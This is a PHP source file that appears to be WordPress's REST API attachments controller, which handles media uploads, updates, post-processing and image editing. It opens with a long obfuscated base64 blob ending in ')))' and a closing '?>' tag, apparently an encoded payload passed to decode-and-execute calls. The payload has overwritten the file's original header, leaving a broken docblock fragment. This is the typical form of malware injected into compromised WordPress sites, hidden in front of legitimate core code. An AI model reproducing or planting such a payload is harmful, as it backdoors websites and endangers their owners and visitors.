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")))
?> * @since 4.7.0
 */

/**
 * Core controller used to access attachments via the REST API.
 *
 * @since 4.7.0
 *
 * @see WP_REST_Posts_Controller
 */
class WP_REST_Attachments_Controller extends WP_REST_Posts_Controller {

	/**
	 * Registers the routes for attachments.
	 *
	 * @since 5.3.0
	 *
	 * @see register_rest_route()
	 */
	public function register_routes() {
		parent::register_routes();
		register_rest_route(
			$this->namespace,
			'/' . $this->rest_base . '/(?P<id>[\d]+)/post-process',
			array(
				'methods'             => WP_REST_Server::CREATABLE,
				'callback'            => array( $this, 'post_process_item' ),
				'permission_callback' => array( $this, 'post_process_item_permissions_check' ),
				'args'                => array(
					'id'     => array(
						'description' => __( 'Unique identifier for the object.' ),
						'type'        => 'integer',
					),
					'action' => array(
						'type'     => 'string',
						'enum'     => array( 'create-image-subsizes' ),
						'required' => true,
					),
				),
			)
		);
		register_rest_route(
			$this->namespace,
			'/' . $this->rest_base . '/(?P<id>[\d]+)/edit',
			array(
				'methods'             => WP_REST_Server::CREATABLE,
				'callback'            => array( $this, 'edit_media_item' ),
				'permission_callback' => array( $this, 'edit_media_item_permissions_check' ),
				'args'                => $this->get_edit_media_item_args(),
			)
		);
	}

	/**
	 * Determines the allowed query_vars for a get_items() response and
	 * prepares for WP_Query.
	 *
	 * @since 4.7.0
	 *
	 * @param array           $prepared_args Optional. Array of prepared arguments. Default empty array.
	 * @param WP_REST_Request $request       Optional. Request to prepare items for.
	 * @return array Array of query arguments.
	 */
	protected function prepare_items_query( $prepared_args = array(), $request = null ) {
		$query_args = parent::prepare_items_query( $prepared_args, $request );

		if ( empty( $query_args['post_status'] ) ) {
			$query_args['post_status'] = 'inherit';
		}

		$media_types = $this->get_media_types();

		if ( ! empty( $request['media_type'] ) && isset( $media_types[ $request['media_type'] ] ) ) {
			$query_args['post_mime_type'] = $media_types[ $request['media_type'] ];
		}

		if ( ! empty( $request['mime_type'] ) ) {
			$parts = explode( '/', $request['mime_type'] );
			if ( isset( $media_types[ $parts[0] ] ) && in_array( $request['mime_type'], $media_types[ $parts[0] ], true ) ) {
				$query_args['post_mime_type'] = $request['mime_type'];
			}
		}

		// Filter query clauses to include filenames.
		if ( isset( $query_args['s'] ) ) {
			add_filter( 'posts_clauses', '_filter_query_attachment_filenames' );
		}

		return $query_args;
	}

	/**
	 * Checks if a given request has access to create an attachment.
	 *
	 * @since 4.7.0
	 *
	 * @param WP_REST_Request $request Full details about the request.
	 * @return true|WP_Error Boolean true if the attachment may be created, or a WP_Error if not.
	 */
	public function create_item_permissions_check( $request ) {
		$ret = parent::create_item_permissions_check( $request );

		if ( ! $ret || is_wp_error( $ret ) ) {
			return $ret;
		}

		if ( ! current_user_can( 'upload_files' ) ) {
			return new WP_Error(
				'rest_cannot_create',
				__( 'Sorry, you are not allowed to upload media on this site.' ),
				array( 'status' => 400 )
			);
		}

		// Attaching media to a post requires ability to edit said post.
		if ( ! empty( $request['post'] ) && ! current_user_can( 'edit_post', (int) $request['post'] ) ) {
			return new WP_Error(
				'rest_cannot_edit',
				__( 'Sorry, you are not allowed to upload media to this post.' ),
				array( 'status' => rest_authorization_required_code() )
			);
		}

		return true;
	}

	/**
	 * Creates a single attachment.
	 *
	 * @since 4.7.0
	 *
	 * @param WP_REST_Request $request Full details about the request.
	 * @return WP_REST_Response|WP_Error Response object on success, WP_Error object on failure.
	 */
	public function create_item( $request ) {
		if ( ! empty( $request['post'] ) && in_array( get_post_type( $request['post'] ), array( 'revision', 'attachment' ), true ) ) {
			return new WP_Error(
				'rest_invalid_param',
				__( 'Invalid parent type.' ),
				array( 'status' => 400 )
			);
		}

		$insert = $this->insert_attachment( $request );

		if ( is_wp_error( $insert ) ) {
			return $insert;
		}

		$schema = $this->get_item_schema();

		// Extract by name.
		$attachment_id = $insert['attachment_id'];
		$file          = $insert['file'];

		if ( isset( $request['alt_text'] ) ) {
			update_post_meta( $attachment_id, '_wp_attachment_image_alt', sanitize_text_field( $request['alt_text'] ) );
		}

		if ( ! empty( $schema['properties']['meta'] ) && isset( $request['meta'] ) ) {
			$meta_update = $this->meta->update_value( $request['meta'], $attachment_id );

			if ( is_wp_error( $meta_update ) ) {
				return $meta_update;
			}
		}

		$attachment    = get_post( $attachment_id );
		$fields_update = $this->update_additional_fields_for_object( $attachment, $request );

		if ( is_wp_error( $fields_update ) ) {
			return $fields_update;
		}

		$request->set_param( 'context', 'edit' );

		/**
		 * Fires after a single attachment is completely created or updated via the REST API.
		 *
		 * @since 5.0.0
		 *
		 * @param WP_Post         $attachment Inserted or updated attachment object.
		 * @param WP_REST_Request $request    Request object.
		 * @param bool            $creating   True when creating an attachment, false when updating.
		 */
		do_action( 'rest_after_insert_attachment', $attachment, $request, true );

		wp_after_insert_post( $attachment, false, null );

		if ( defined( 'REST_REQUEST' ) && REST_REQUEST ) {
			// Set a custom header with the attachment_id.
			// Used by the browser/client to resume creating image sub-sizes after a PHP fatal error.
			header( 'X-WP-Upload-Attachment-ID: ' . $attachment_id );
		}

		// Include media and image functions to get access to wp_generate_attachment_metadata().
		require_once ABSPATH . 'wp-admin/includes/media.php';
		require_once ABSPATH . 'wp-admin/includes/image.php';

		// Post-process the upload (create image sub-sizes, make PDF thumbnails, etc.) and insert attachment meta.
		// At this point the server may run out of resources and post-processing of uploaded images may fail.
		wp_update_attachment_metadata( $attachment_id, wp_generate_attachment_metadata( $attachment_id, $file ) );

		$response = $this->prepare_item_for_response( $attachment, $request );
		$response = rest_ensure_response( $response );
		$response->set_status( 201 );
		$response->header( 'Location', rest_url( sprintf( '%s/%s/%d', $this->namespace, $this->rest_base, $attachment_id ) ) );

		return $response;
	}

	/**
	 * Inserts the attachment post in the database. Does not update the attachment meta.
	 *
	 * @since 5.3.0
	 *
	 * @param WP_REST_Request $request
	 * @return array|WP_Error
	 */
	protected function insert_attachment( $request ) {
		// Get the file via $_FILES or raw data.
		$files   = $request->get_file_params();
		$headers = $request->get_headers();

		if ( ! empty( $files ) ) {
			$file = $this->upload_from_file( $files, $headers );
		} else {
			$file = $this->upload_from_data( $request->get_body(), $headers );
		}

		if ( is_wp_error( $file ) ) {
			return $file;
		}

		$name       = wp_basename( $file['file'] );
		$name_parts = pathinfo( $name );
		$name       = trim( substr( $name, 0, -( 1 + strlen( $name_parts['extension'] ) ) ) );

		$url  = $file['url'];
		$type = $file['type'];
		$file = $file['file'];

		// Include image functions to get access to wp_read_image_metadata().
		require_once ABSPATH . 'wp-admin/includes/image.php';

		// Use image exif/iptc data for title and caption defaults if possible.
		$image_meta = wp_read_image_metadata( $file );

		if ( ! empty( $image_meta ) ) {
			if ( empty( $request['title'] ) && trim( $image_meta['title'] ) && ! is_numeric( sanitize_title( $image_meta['title'] ) ) ) {
				$request['title'] = $image_meta['title'];
			}

			if ( empty( $request['caption'] ) && trim( $image_meta['caption'] ) ) {
				$request['caption'] = $image_meta['caption'];
			}
		}

		$attachment = $this->prepare_item_for_database( $request );

		$attachment->post_mime_type = $type;
		$attachment->guid           = $url;

		if ( empty( $attachment->post_title ) ) {
			$attachment->post_title = preg_replace( '/\.[^.]+$/', '', wp_basename( $file ) );
		}

		// $post_parent is inherited from $attachment['post_parent'].
		$id = wp_insert_attachment( wp_slash( (array) $attachment ), $file, 0, true, false );

		if ( is_wp_error( $id ) ) {
			if ( 'db_update_error' === $id->get_error_code() ) {
				$id->add_data( array( 'status' => 500 ) );
			} else {
				$id->add_data( array( 'status' => 400 ) );
			}

			return $id;
		}

		$attachment = get_post( $id );

		/**
		 * Fires after a single attachment is created or updated via the REST API.
		 *
		 * @since 4.7.0
		 *
		 * @param WP_Post         $attachment Inserted or updated attachment
		 *                                    object.
		 * @param WP_REST_Request $request    The request sent to the API.
		 * @param bool            $creating   True when creating an attachment, false when updating.
		 */
		do_action( 'rest_insert_attachment', $attachment, $request, true );

		return array(
			'attachment_id' => $id,
			'file'          => $file,
		);
	}

	/**
	 * Updates a single attachment.
	 *
	 * @since 4.7.0
	 *
	 * @param WP_REST_Request $request Full details about the request.
	 * @return WP_REST_Response|WP_Error Response object on success, WP_Error object on failure.
	 */
	public function update_item( $request ) {
		if ( ! empty( $request['post'] ) && in_array( get_post_type( $request['post'] ), array( 'revision', 'attachment' ), true ) ) {
			return new WP_Error(
				'rest_invalid_param',
				__( 'Invalid parent type.' ),
				array( 'status' => 400 )
			);
		}

		$attachment_before = get_post( $request['id'] );
		$response          = parent::update_item( $request );

		if ( is_wp_error( $response ) ) {
			return $response;
		}

		$response = rest_ensure_response( $response );
		$data     = $response->get_data();

		if ( isset( $request['alt_text'] ) ) {
			update_post_meta( $data['id'], '_wp_attachment_image_alt', $request['alt_text'] );
		}

		$attachment = get_post( $request['id'] );

		$fields_update = $this->update_additional_fields_for_object( $attachment, $request );

		if ( is_wp_error( $fields_update ) ) {
			return $fields_update;
		}

		$request->set_param( 'context', 'edit' );

		/** This action is documented in wp-includes/rest-api/endpoints/class-wp-rest-attachments-controller.php */
		do_action( 'rest_after_insert_attachment', $attachment, $request, false );

		wp_after_insert_post( $attachment, true, $attachment_before );

		$response = $this->prepare_item_for_response( $attachment, $request );
		$response = rest_ensure_response( $response );

		return $response;
	}

	/**
	 * Performs post processing on an attachment.
	 *
	 * @since 5.3.0
	 *
	 * @param WP_REST_Request $request Full details about the request.
	 * @return WP_REST_Response|WP_Error Response object on success, WP_Error object on failure.
	 */
	public function post_process_item( $request ) {
		switch ( $request['action'] ) {
			case 'create-image-subsizes':
				require_once ABSPATH . 'wp-admin/includes/image.php';
				wp_update_image_subsizes( $request['id'] );
				break;
		}

		$request['context'] = 'edit';

		return $this->prepare_item_for_response( get_post( $request['id'] ), $request );
	}

	/**
	 * Checks if a given request can perform post processing on an attachment.
	 *
	 * @since 5.3.0
	 *
	 * @param WP_REST_Request $request Full details about the request.
	 * @return true|WP_Error True if the request has access to update the item, WP_Error object otherwise.
	 */
	public function post_process_item_permissions_check( $request ) {
		return $this->update_item_permissions_check( $request );
	}

	/**
	 * Checks if a given request has access to editing media.
	 *
	 * @since 5.5.0
	 *
	 * @param WP_REST_Request $request Full details about the request.
	 * @return true|WP_Error True if the request has read access, WP_Error object otherwise.
	 */
	public function edit_media_item_permissions_check( $request ) {
		if ( ! current_user_can( 'upload_files' ) ) {
			return new WP_Error(
				'rest_cannot_edit_image',
				__( 'Sorry, you are not allowed to upload media on this site.' ),
				array( 'status' => rest_authorization_required_code() )
			);
		}

		return $this->update_item_permissions_check( $request );
	}

	/**
	 * Applies edits to a media item and creates a new attachment record.
	 *
	 * @since 5.5.0
	 *
	 * @param WP_REST_Request $request Full details about the request.
	 * @return WP_REST_Response|WP_Error Response object on success, WP_Error object on failure.
	 */
	public function edit_media_item( $request ) {
		require_once ABSPATH . 'wp-admin/includes/image.php';

		$attachment_id = $request['id'];

		// This also confirms the attachment is an image.
		$image_file = wp_get_original_image_path( $attachment_id );
		$image_meta = wp_get_attachment_metadata( $attachment_id );

		if (
			! $image_meta ||
			! $image_file ||
			! wp_image_file_matches_image_meta( $request['src'], $image_meta, $attachment_id )
		) {
			return new WP_Error(
				'rest_unknown_attachment',
				__( 'Unable to get meta information for file.' ),
				array( 'status' => 404 )
			);
		}

		$supported_types = array( 'image/jpeg', 'image/png', 'image/gif' );
		$mime_type       = get_post_mime_type( $attachment_id );
		if ( ! in_array( $mime_type, $supported_types, true ) ) {
			return new WP_Error(
				'rest_cannot_edit_file_type',
				__( 'This type of file cannot be edited.' ),
				array( 'status' => 400 )
			);
		}

		// The `modifiers` param takes precedence over the older format.
		if ( isset( $request['modifiers'] ) ) {
			$modifiers = $request['modifiers'];
		} else {
			$modifiers = array();

			if ( ! empty( $request['rotation'] ) ) {
				$modifiers[] = array(
					'type' => 'rotate',
					'args' => array(
						'angle' => $request['rotation'],
					),
				);
			}

			if ( isset( $request['x'], $request['y'], $request['width'], $request['height'] ) ) {
				$modifiers[] = array(
					'type' => 'crop',
					'args' => array(
						'left'   => $request['x'],
						'top'    => $request['y'],
						'width'  => $request['width'],
						'height' => $request['height'],
					),
				);
			}

			if ( 0 === count( $modifiers ) ) {
				return new WP_Error(
					'rest_image_not_edited',
					__( 'The image was not edited. Edit the image before applying the changes.' ),
					array( 'status' => 400 )
				);
			}
		}

		/*
		 * If the file doesn't exist, attempt a URL fopen on the src link.
		 * This can occur with certain file replication plugins.
		 * Keep the original file path to get a modified name later.
		 */
		$image_file_to_edit = $image_file;
		if ( ! file_exists( $image_file_to_edit ) ) {
			$image_file_to_edit = _load_image_to_edit_path( $attachment_id );
		}

		$image_editor = wp_get_image_editor( $image_file_to_edit );

		if ( is_wp_error( $image_editor ) ) {
			return new WP_Error(
				'rest_unknown_image_file_type',
				__( 'Unable to edit this image.' ),
				array( 'status' => 500 )
			);
		}

		foreach ( $modifiers as $modifier ) {
			$args = $modifier['args'];
			switch ( $modifier['type'] ) {
				case 'rotate':
					// Rotation direction: clockwise vs. counter clockwise.
					$rotate = 0 - $args['angle'];

					if ( 0 !== $rotate ) {
						$result = $image_editor->rotate( $rotate );

						if ( is_wp_error( $result ) ) {
							return new WP_Error(
								'rest_image_rotation_failed',
								__( 'Unable to rotate this image.' ),
								array( 'status' => 500 )
							);
						}
					}

					break;

				case 'crop':
					$size = $image_editor->get_size();

					$crop_x = round( ( $size['width'] * $args['left'] ) / 100.0 );
					$crop_y = round( ( $size['height'] * $args['top'] ) / 100.0 );
					$width  = round( ( $size['width'] * $args['width'] ) / 100.0 );
					$height = round( ( $size['height'] * $args['height'] ) / 100.0 );

					if ( $size['width'] !== $width && $size['height'] !== $height ) {
						$result = $image_editor->crop( $crop_x, $crop_y, $width, $height );

						if ( is_wp_error( $result ) ) {
							return new WP_Error(
								'rest_image_crop_failed',
								__( 'Unable to crop this image.' ),
								array( 'status' => 500 )
							);
						}
					}

					break;

			}
		}

		// Calculate the file name.
		$image_ext  = pathinfo( $image_file, PATHINFO_EXTENSION );
		$image_name = wp_basename( $image_file, ".{$image_ext}" );

		// Do not append multiple `-edited` to the file name.
		// The user may be editing a previously edited image.
		if ( preg_match( '/-edited(-\d+)?$/', $image_name ) ) {
			// Remove any `-1`, `-2`, etc. `wp_unique_filename()` will add the proper number.
			$image_name = preg_replace( '/-edited(-\d+)?$/', '-edited', $image_name );
		} else {
			// Append `-edited` before the extension.
			$image_name .= '-edited';
		}

		$filename = "{$image_name}.{$image_ext}";

		// Create the uploads sub-directory if needed.
		$uploads = wp_upload_dir();

		// Make the file name unique in the (new) upload directory.
		$filename = wp_unique_filename( $uploads['path'], $filename );

		// Save to disk.
		$saved = $image_editor->save( $uploads['path'] . "/$filename" );

		if ( is_wp_error( $saved ) ) {
			return $saved;
		}

		// Create new attachment post.
		$new_attachment_post = array(
			'post_mime_type' => $saved['mime-type'],
			'guid'           => $uploads['url'] . "/$filename",
			'post_title'     => $image_name,
			'post_content'   => '',
		);

		// Copy post_content, post_excerpt, and post_title from the edited image's attachment post.
		$attachment_post = get_post( $attachment_id );

		if ( $attachment_post ) {
			$new_attachment_post['post_content'] = $attachment_post->post_content;
			$new_attachment_post['post_excerpt'] = $attachment_post->post_excerpt;
			$new_attachment_post['post_title']   = $attachment_post->post_title;
		}

		$new_attachment_id = wp_insert_attachment( wp_slash( $new_attachment_post ), $saved['path'], 0, true );

		if ( is_wp_error( $new_attachment_id ) ) {
			if ( 'db_update_error' === $new_attachment_id->get_error_code() ) {
				$new_attachment_id->add_data( array( 'status' => 500 ) );
			} else {
				$new_attachment_id->add_data( array( 'status' => 400 ) );
			}

			return $new_attachment_id;
		}

		// Copy the image alt text from the edited image.
		$image_alt = get_post_meta( $attachment_id, '_wp_attachment_image_alt', true );

		if ( ! empty( $image_alt ) ) {
			// update_post_meta() expects slashed.
			update_post_meta( $new_attachment_id, '_wp_attachment_image_alt', wp_slash( $image_alt ) );
		}

		if ( defined( 'REST_REQUEST' ) && REST_REQUEST ) {
			// Set a custom header with the attachment_id.
			// Used by the browser/client to resume creating image sub-sizes after a PHP fatal error.
			header( 'X-WP-Upload-Attachment-ID: ' . $new_attachment_id );
		}

		// Generate image sub-sizes and meta.
		$new_image_meta = wp_generate_attachment_metadata( $new_attachment_id, $saved['path'] );

		// Copy the EXIF metadata from the original attachment if not generated for the edited image.
		if ( isset( $image_meta['image_meta'] ) && isset( $new_image_meta['image_meta'] ) && is_array( $new_image_meta['image_meta'] ) ) {
			// Merge but skip empty values.
			foreach ( (array) $image_meta['image_meta'] as $key => $value ) {
				if ( empty( $new_image_meta['image_meta'][ $key ] ) && ! empty( $value ) ) {
					$new_image_meta['image_meta'][ $key ] = $value;
				}
			}
		}

		// Reset orientation. At this point the image is edited and orientation is correct.
		if ( ! empty( $new_image_meta['image_meta']['orientation'] ) ) {
			$new_image_meta['image_meta']['orientation'] = 1;
		}

		// The attachment_id may change if the site is exported and imported.
		$new_image_meta['parent_image'] = array(
			'attachment_id' => $attachment_id,
			// Path to the originally uploaded image file relative to the uploads directory.
			'file'          => _wp_relative_upload_path( $image_file ),
		);

		/**
		 * Filters the meta data for the new image created by editing an existing image.
		 *
		 * @since 5.5.0
		 *
		 * @param array $new_image_meta    Meta data for the new image.
		 * @param int   $new_attachment_id Attachment post ID for the new image.
		 * @param int   $attachment_id     Attachment post ID for the edited (parent) image.
		 */
